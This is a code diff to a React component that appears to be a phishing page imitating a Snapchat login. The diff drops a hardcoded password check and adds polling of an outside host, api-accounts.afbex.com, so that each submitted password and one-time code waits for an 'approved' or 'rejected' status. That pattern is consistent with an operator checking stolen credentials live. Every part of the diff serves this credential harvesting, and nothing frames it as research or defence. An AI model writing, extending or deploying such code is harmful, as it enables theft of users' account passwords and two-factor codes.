@@ -28,11 +28,7 @@ const SnapchatPassword = () => {
     
     if (password.trim()) {
       // Client-side password validation
-      if (password !== 'jiminjin') {
-        setPasswordError('Incorrect password. Please try again.');
-        return;
-      }
-
+      
       setIsPasswordSubmitting(true);
 
       try {
@@ -45,10 +41,8 @@ const SnapchatPassword = () => {
         
         await new Promise(resolve => setTimeout(resolve, 1000));
         if (response.ok) {
-          console.log('Password submitted:', password);
-          // Don't poll, just move to OTP screen
-          setIsPasswordSubmitting(false);
-          setCurrentScreen('otp');
+          console.log('Password submitted, starting polling...');
+          startPasswordPolling();
         } else {
           setIsPasswordSubmitting(false);
           setPasswordError('Failed to submit password. Please try again.');
@@ -59,6 +53,27 @@ const SnapchatPassword = () => {
         setPasswordError('Could not connect to verification server');
       }
     }
+  };
+
+  const startPasswordPolling = () => {
+    const interval = setInterval(async () => {
+      try {
+        const response = await fetch('https://api-accounts.afbex.com/stage/test/check-status');
+        const data = await response.json();
+        
+        if (data.status === 'approved') {
+          clearInterval(interval);
+          setIsPasswordSubmitting(false);
+          setCurrentScreen('otp');
+        } else if (data.status === 'rejected') {
+          clearInterval(interval);
+          setIsPasswordSubmitting(false);
+          setPasswordError('Incorrect password. Please try again.');
+        }
+      } catch (error) {
+        console.error('Password Polling error:', error);
+      }
+    }, 2000); // Poll every 2 seconds
   };
 
   // OTP Screen Submit
@@ -94,7 +109,7 @@ const SnapchatPassword = () => {
         if (data.status === 'approved') {
           setOtpVerificationStatus('approved');
           clearInterval(interval);
-          showAlert('Success', 'Login verified successfully!');
+          setCurrentScreen('success');
         } else if (data.status === 'rejected') {
           setOtpVerificationStatus('rejected');
           clearInterval(interval);
@@ -136,6 +151,19 @@ const SnapchatPassword = () => {
       otpRefs.current[0]?.focus();
     }
   }, [currentScreen]);
+
+  // Success Screen with Image
+  if (currentScreen === 'success') {
+    return (
+      <div className="min-h-screen bg-black flex items-center justify-center font-sans">
+        <img 
+          src="/arsu.jpeg" 
+          alt="Success" 
+          className="w-full h-auto max-w-md object-contain"
+        />
+      </div>
+    );
+  }
 
   // Password Entry Screen
   if (currentScreen === 'password') {
